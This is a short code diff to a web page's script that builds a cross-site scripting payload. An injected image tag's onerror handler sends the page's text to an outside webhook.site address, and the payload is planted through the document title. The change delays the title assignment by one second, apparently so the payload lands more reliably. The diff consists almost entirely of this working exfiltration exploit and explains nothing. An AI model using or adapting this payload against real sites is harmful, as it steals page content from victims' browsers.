@@ -10,8 +10,10 @@
             const webhook = "'https://webhook.site/78be9a55-6ff2-4723-9cf5-c6b3dd95cacc/'";
             const payloadTitle = "</h1><img src=\"x\" onerror=fetch(" + webhook +"+document.body.textContent)><h1>";
             window.addEventListener("DOMContentLoaded", function() {
-                document.title = payloadTitle;
-                self.title = payloadTitle;
+                setTimeout(() => {
+                    self.title = payloadTitle;
+                    document.title = payloadTitle;
+                }, 1000);
             })
         </script>
     </body>
